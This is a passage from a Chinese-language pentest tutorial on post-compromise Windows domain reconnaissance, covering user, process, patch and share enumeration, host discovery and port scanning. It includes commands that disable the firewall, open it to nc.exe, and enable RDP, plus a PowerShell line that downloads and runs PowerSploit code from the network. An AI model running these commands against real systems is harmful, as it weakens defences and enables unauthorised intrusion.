name,version&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1610.png" alt="图片"></p><h3 id="3：查询本机服务信息"><a href="#3：查询本机服务信息" class="headerlink" title="3：查询本机服务信息"></a>3：查询本机服务信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1611.png" alt="图片"></p><h3 id="4：查询进程列表"><a href="#4：查询进程列表" class="headerlink" title="4：查询进程列表"></a>4：查询进程列表</h3><p>查看当前进程列表和进程用户、分析软件、邮件客户端、vpn和杀毒软件等进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1612.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1613.png" alt="图片"></p><h3 id="5：查看启动程序信息"><a href="#5：查看启动程序信息" class="headerlink" title="5：查看启动程序信息"></a>5：查看启动程序信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1614.png" alt="图片"></p><h3 id="6：查看计划任务"><a href="#6：查看计划任务" class="headerlink" title="6：查看计划任务"></a>6：查看计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1615.png" alt="图片"></p><h3 id="7：查看主机开机时间"><a href="#7：查看主机开机时间" class="headerlink" title="7：查看主机开机时间"></a>7：查看主机开机时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1616.png" alt="图片"></p><h3 id="8：查询用户列表"><a href="#8：查询用户列表" class="headerlink" title="8：查询用户列表"></a>8：查询用户列表</h3><h4 id="（1）查看有那些用户"><a href="#（1）查看有那些用户" class="headerlink" title="（1）查看有那些用户"></a>（1）查看有那些用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1617.png" alt="图片"></p><h4 id="（2）获取本地管理员、包含域用户信息"><a href="#（2）获取本地管理员、包含域用户信息" class="headerlink" title="（2）获取本地管理员、包含域用户信息"></a>（2）获取本地管理员、包含域用户信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1618.png" alt="图片"></p><h4 id="（3）查看当前在线用户"><a href="#（3）查看当前在线用户" class="headerlink" title="（3）查看当前在线用户"></a>（3）查看当前在线用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1619.png" alt="图片"></p><h4 id="（4）列出或断开本地计算机与所连接的客户端之间的会话"><a href="#（4）列出或断开本地计算机与所连接的客户端之间的会话" class="headerlink" title="（4）列出或断开本地计算机与所连接的客户端之间的会话"></a>（4）列出或断开本地计算机与所连接的客户端之间的会话</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h4 id="（5）查询端口列表"><a href="#（5）查询端口列表" class="headerlink" title="（5）查询端口列表"></a>（5）查询端口列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1620.png" alt="图片"></p><h4 id="（6）查询补丁信息"><a href="#（6）查询补丁信息" class="headerlink" title="（6）查询补丁信息"></a>（6）查询补丁信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1621.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1622.png" alt="图片"></p><h4 id="（7）查询本机共享列表"><a href="#（7）查询本机共享列表" class="headerlink" title="（7）查询本机共享列表"></a>（7）查询本机共享列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1623.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1624.png" alt="图片"></p><h3 id="9：查询路由表及所有可用接口的ARP缓冲表"><a href="#9：查询路由表及所有可用接口的ARP缓冲表" class="headerlink" title="9：查询路由表及所有可用接口的ARP缓冲表"></a>9：查询路由表及所有可用接口的ARP缓冲表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1625.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1626.png" alt="图片"></p><h3 id="10：查询防火墙相关配置"><a href="#10：查询防火墙相关配置" class="headerlink" title="10：查询防火墙相关配置"></a>10：查询防火墙相关配置</h3><h4 id="（1）关闭防火墙"><a href="#（1）关闭防火墙" class="headerlink" title="（1）关闭防火墙"></a>（1）关闭防火墙</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">win 2003及之前的版本用这条命令：</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line"></span><br><span class="line">win 2003之后的版本用这条命令：</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h4 id="（2）查看防火墙配置"><a href="#（2）查看防火墙配置" class="headerlink" title="（2）查看防火墙配置"></a>（2）查看防火墙配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1627.png" alt="图片"></p><h4 id="（3）修改防火墙配置"><a href="#（3）修改防火墙配置" class="headerlink" title="（3）修改防火墙配置"></a>（3）修改防火墙配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">win 2003及之前的版本，运行指定程序全部连接：</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line"></span><br><span class="line">win 2003之后的版本用这条：</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许指定程序连出，命令如下</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot; </span><br><span class="line"></span><br><span class="line">允许 3389 端口放行，命令如下</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow </span><br><span class="line"></span><br><span class="line">自定义防火墙日志储存位置 </span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot; </span><br></pre></td></tr></table></figure><h3 id="11：查看代理配置情况"><a href="#11：查看代理配置情况" class="headerlink" title="11：查看代理配置情况"></a>11：查看代理配置情况</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1628.png" alt="图片"></p><h3 id="12：查询并开启远程连接服务"><a href="#12：查询并开启远程连接服务" class="headerlink" title="12：查询并开启远程连接服务"></a>12：查询并开启远程连接服务</h3><h4 id="（1）查看远程连接端口"><a href="#（1）查看远程连接端口" class="headerlink" title="（1）查看远程连接端口"></a>（1）查看远程连接端口</h4><p>在 <code>cmd</code> 下使用注册表查询语句，命令如下，得到连接端口为 <code>0xd3d</code>，转换后为 <code>3389</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1629.png" alt="图片"></p><h4 id="（2）在-Windows-Server-2003-中开启-3389-端口"><a href="#（2）在-Windows-Server-2003-中开启-3389-端口" class="headerlink" title="（2）在 Windows Server 2003 中开启 3389 端口"></a>（2）在 Windows Server 2003 中开启 3389 端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;)  call setallowtsconnections 1</span><br></pre></td></tr></table></figure><h4 id="（3）在Windows-Server-2008和Windows-Server-2012中开启3389端口"><a href="#（3）在Windows-Server-2008和Windows-Server-2012中开启3389端口" class="headerlink" title="（3）在Windows Server 2008和Windows Server 2012中开启3389端口"></a>（3）在Windows Server 2008和Windows Server 2012中开启3389端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1 </span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f </span><br></pre></td></tr></table></figure><h2 id="2-2-自动收集信息"><a href="#2-2-自动收集信息" class="headerlink" title="2.2 自动收集信息"></a>2.2 自动收集信息</h2><p>使用<code>WMIC</code>自动脚本来收集信息,打开运行 <code>wmic_info.bat</code>  会自动生成一个 <code>out.html</code> 文件</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1630.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1631.png" alt="图片"></p><h3 id="Empire下的主机信息搜集"><a href="#Empire下的主机信息搜集" class="headerlink" title="Empire下的主机信息搜集"></a>Empire下的主机信息搜集</h3><p>Empirer提供了收集主机的模块。</p><p>下载地址：<a href="https://github.com/EmpireProject/Empire.git">https://github.com/EmpireProject/Empire.git</a></p><h2 id="2-3-查询当前权限"><a href="#2-3-查询当前权限" class="headerlink" title="2.3 查询当前权限"></a>2.3 查询当前权限</h2><h3 id="1、查看当前权限"><a href="#1、查看当前权限" class="headerlink" title="1、查看当前权限"></a>1、查看当前权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p>本地管理员用户，或者是本地用户：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1632.png" alt="图片"></p><p>域内用户：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1633.png" alt="图片"></p><p>在以上三种情况下，如果当前内网中存在域，那么本地普通用户只能查询本机相关信息，不能查询域内信息；而本地管理员用户和域内用户可以查询域内信息。其原理是：域内的所有查询都是通过域控制器实现的（基于LDAP协议），而这个查询需要经过权限认证，所以只有域用户才拥有这个权限；当域用户执行查询命令时，会自动使用kerberos协议进行认证，无须额外输入账号密码。</p><h3 id="2、获取域SID"><a href="#2、获取域SID" class="headerlink" title="2、获取域SID"></a>2、获取域SID</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1634.png" alt="图片"></p><p>当前域 <code>hacker</code> 的 <code>SID</code> 为：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1635.png" alt="图片"></p><h3 id="3、查询指定用户的详细信息"><a href="#3、查询指定用户的详细信息" class="headerlink" title="3、查询指定用户的详细信息"></a>3、查询指定用户的详细信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user 用户名 /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1636.png" alt="图片"></p><h2 id="2-4-判断是否存在域"><a href="#2-4-判断是否存在域" class="headerlink" title="2.4 判断是否存在域"></a>2.4 判断是否存在域</h2><h3 id="1、使用ipconfig命令"><a href="#1、使用ipconfig命令" class="headerlink" title="1、使用ipconfig命令"></a>1、使用ipconfig命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1637.png" alt="图片"></p><p>然后可以使用反向解析查询命令 <code>nslookup</code> 来解析域名的IP地址。用解析到的IP地址进行对比，判断域控制器和DNS服务器是否在同一台服务器上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nclookup hacker.lab</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1638.png" alt="图片"></p><h3 id="2、查看系统详细配置"><a href="#2、查看系统详细配置" class="headerlink" title="2、查看系统详细配置"></a>2、查看系统详细配置</h3><p>使用 <code>systeminfo</code> 命令，如果存在域就会显示：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1639.png" alt="图片"></p><p>如果不存在就会显示一个：<code>WORKGROUP</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1640.png" alt="图片"></p><h3 id="3、查询当前登录域及登录用户信息"><a href="#3、查询当前登录域及登录用户信息" class="headerlink" title="3、查询当前登录域及登录用户信息"></a>3、查询当前登录域及登录用户信息</h3><p>执行命令如果存在域那么就会显示工作站域和工作站域DNS等信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1641.png" alt="图片"></p><p>执行命令如果不存在域那么就会显示<code>WORKGROUP</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1642.png" alt="图片"></p><h3 id="4、判断主域"><a href="#4、判断主域" class="headerlink" title="4、判断主域"></a>4、判断主域</h3><p>判断主域：域服务器通常会同时作为时间服务器使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p>有三种情况，第一种中存在域，当前是域用户：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1643.png" alt="图片"></p><p>第二种是，不存在域，环境是工作组：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1644.png" alt="图片"></p><p>第三种是，存在域，但是当前用户不是域用户</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1645.png" alt="图片"></p><h2 id="2-5-探测域内存活主机"><a href="#2-5-探测域内存活主机" class="headerlink" title="2.5 探测域内存活主机"></a>2.5 探测域内存活主机</h2><h3 id="1、使用nbtscan"><a href="#1、使用nbtscan" class="headerlink" title="1、使用nbtscan"></a>1、使用nbtscan</h3><p>nbtscan是一个命令行工具，用于扫描本地或远程TCP/IP网络上开放的NetBIOS名称服务器。</p><p>NetBOIS是局域网程序使用的一种程序编程接口（API），为程序提供了请求低级别服务的统一命令集，为局域网提供了网络及其他特殊功能。几乎所有局域网都是在NetBIOS协议的基础上工作的。NetBIOS也是计算机的标识名，主要用于局域网中计算机的互访问。NetBIOS的工作流程就是正常的机器名解析查询应答过程，因此推荐优先使用。</p><p>使用命令格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe 10.10.10.0/20</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1646.png" alt="图片"></p><p>第一列为IP地址，第二列为机器名和所在域的名称，第三列是机器所开启的服务列表。</p><p>服务列表具体含义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Token：含义：</span><br><span class="line">SHARING 该机器中存在运行的文件和打印共享服务，但不一定有内容共享</span><br><span class="line">DC 该机器可能是域控制器</span><br><span class="line">U=USER 该机器中有登陆名为User的用户（不太准确）</span><br><span class="line">IIS 该机器中可能安装了IIS服务</span><br><span class="line">EXCHANGE 该机器中可能安装了Exchane</span><br><span class="line">NOTES 该机器中可能安装了Lotus Notes电子邮箱客户端</span><br><span class="line">？ 没有识别出机器的NetBIOS资源（可以使用 -F 选项再次扫描）</span><br></pre></td></tr></table></figure><h3 id="2、利用ICMP协议快速探测内网"><a href="#2、利用ICMP协议快速探测内网" class="headerlink" title="2、利用ICMP协议快速探测内网"></a>2、利用ICMP协议快速探测内网</h3><p>除了使用NetBIOS探测内网，还可以使用ICMP协议去探测内网情况。</p><p>使用ping命令，依次对内网中的每个IP地址执行Ping命令，可以快速找出内网中所有存活的主机（比较慢）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL=&quot; </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1647.png" alt="图片"></p><p>还可以使用VBS脚本进行探测，脚本源代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">strSubNet = &quot;10.10.10.&quot; </span><br><span class="line">Set objFSO= CreateObject(&quot;Scripting.FileSystemObject&quot;) </span><br><span class="line">Set objTS = objfso.CreateTextFile(&quot;C:\Windows\Temp\Result.txt&quot;) </span><br><span class="line">For i = 1 To 254</span><br><span class="line">strComputer = strSubNet &amp; i </span><br><span class="line">blnResult = Ping(strComputer) </span><br><span class="line">If blnResult = True Then </span><br><span class="line">objTS.WriteLine strComputer &amp; &quot; is alived ! :) &quot; </span><br><span class="line">End If</span><br><span class="line">Next </span><br><span class="line">objTS.Close </span><br><span class="line">WScript.Echo &quot;All Ping Scan , All Done ! :) &quot; </span><br><span class="line">Function Ping(strComputer) </span><br><span class="line">Set objWMIService = GetObject(&quot;winmgmts:\\.\root\cimv2&quot;) </span><br><span class="line">Set colItems = objWMIService.ExecQuery(&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot; &amp; strComputer &amp; &quot;&#x27;&quot;) </span><br><span class="line">For Each objItem In colItems </span><br><span class="line">Select case objItem.StatusCode </span><br><span class="line">Case 0 </span><br><span class="line">Ping = True </span><br><span class="line">Case Else </span><br><span class="line">Ping = False </span><br><span class="line">End select </span><br><span class="line">Exit For </span><br><span class="line">Next </span><br><span class="line">End Function</span><br></pre></td></tr></table></figure><p>运行命令：cscript 1.vbs（速度很慢）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1648.png" alt="图片"></p><p>运行完后它会把结果保存到<code>C:\Windows\Temp\Result.txt</code> 中：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1649.png" alt="图片"></p><h3 id="3、通过ARP扫描探测内网"><a href="#3、通过ARP扫描探测内网" class="headerlink" title="3、通过ARP扫描探测内网"></a>3、通过ARP扫描探测内网</h3><h4 id="3-1：apr-scan工具"><a href="#3-1：apr-scan工具" class="headerlink" title="3.1：apr-scan工具"></a>3.1：apr-scan工具</h4><p>把arp-scan工具上传到目标主机上，可以自定义子网掩码，指定扫描范围，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan.exe -t 10.10.10.0/20</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1650.png" alt="图片"></p><h4 id="3-2-Empire中的arpscan模块"><a href="#3-2-Empire中的arpscan模块" class="headerlink" title="3.2:Empire中的arpscan模块"></a>3.2:Empire中的arpscan模块</h4><p>下载地址：<a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p><p>PS：在这里安装Empire需要更改一下格式：<a href="https://jingyan.baidu.com/article/215817f788e8c21eda1423ea.html">https://jingyan.baidu.com/article/215817f788e8c21eda1423ea.html</a></p><p>Empire中内置了arpscan的模块，这个模块可以在局域网内发送ARP数据包，搜集活跃主机的IP地址、MAC地址信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/network/arpscan</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1651.png" alt="图片"></p><h4 id="3-3：Nishang中的Invoke-ARPScan-ps1脚本"><a href="#3-3：Nishang中的Invoke-ARPScan-ps1脚本" class="headerlink" title="3.3：Nishang中的Invoke-ARPScan.ps1脚本"></a>3.3：Nishang中的Invoke-ARPScan.ps1脚本</h4><p>使用 Nishang 中的 Invoke-ARPScan.ps1 脚本，可以将脚本上传到目标主机执行，也可以直接远程加载执行、自定义掩码和扫描范围，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot; &gt;&gt; result.txt</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1652.png" alt="图片"></p><h3 id="4、通过常规TCP-UDP端口扫描探测内网"><a href="#4、通过常规TCP-UDP端口扫描探测内网" class="headerlink" title="4、通过常规TCP/UDP端口扫描探测内网"></a>4、通过常规TCP/UDP端口扫描探测内网</h3><p>ScanLine 是一款经典的端口扫描工具，Windows 全版本通用，体积小，仅使用单个文件，同时支持对 TCP/UDP 的端口扫描，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline.exe -h -t 22,80,110,389,445,3389,1099,1433,3306,3389 -u 53,161,137,139 -O log.txt -p 10.10.10.1-254 /b</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1653.png" alt="图片"></p><h2 id="2-6-扫描域内端口"><a href="#2-6-扫描域内端口" class="headerlink" title="2.6 扫描域内端口"></a>2.6 扫描域内端口</h2><p>通过查询目标主机的端口开放信息，不仅可以了解目标主机所开放的服务，还可以找出其开放服务的漏洞、分析目标的网络拓扑结构等，具体需要关注以下三点。</p><ul><li>端口的 Banner 信息。</li><li>端口上运行的服务。</li><li>常见应用的默认端口</li></ul><h3 id="1：利用Telnet命令进行扫描"><a href="#1：利用Telnet命令进行扫描" class="headerlink" title="1：利用Telnet命令进行扫描"></a>1：利用Telnet命令进行扫描</h3><p>Telnet协议是<code>TCP/IP</code>协议的一种，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程工作的能力。</p><p>在目标主机上使用telnet协议，可以与目标服务器建立连接。如果只是想快速探测某太主机的某个常规高危端口是否开放，使用telnet命令就可以做到！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet DC 端口</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1654.png" alt="图片"></p><h3 id="2：使用S扫描器"><a href="#2：使用S扫描器" class="headerlink" title="2：使用S扫描器"></a>2：使用S扫描器</h3><p>S 扫描器是早期的一种比较快速的端口扫描工具，特别适合运行在 Windows Sever 2003 以下的平台上，支持大网段扫描。S 扫描器的扫描结果默认保存在其目录下的 result.txt 文件中。推荐使用 TCP 扫描，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S.exe TCP 10.10.10.1 10.10.10.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111 256 /Banner /save</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1655.png" alt="图片"></p><h3 id="3：使用Metasploit端口扫描"><a href="#3：使用Metasploit端口扫描" class="headerlink" title="3：使用Metasploit端口扫描"></a>3：使用Metasploit端口扫描</h3><p>MSF这里就不多介绍了，我博客 <a href="http://www.saulgoodman.cn/">www.saulGoodman.cn</a> 里面讲了MSF的使用，端口扫描使用这个模块 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/tcp：</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1656.png" alt="图片"></p><h3 id="4：使用PowerScript的Invoke-portscan-ps1脚本"><a href="#4：使用PowerScript的Invoke-portscan-ps1脚本" class="headerlink" title="4：使用PowerScript的Invoke-portscan.ps1脚本"></a>4：使用PowerScript的Invoke-portscan.ps1脚本</h3><p>以无文件形式扫描，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &#x27;445,1433,8080,3389,80&#x27; -oA c:\windows\temp\res.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1657.png" alt="图片"></p><p>使用还是挺不错的，速度挺快。</p><h3 id="5：使用Nishang的Invoke-PortScan模块"><a 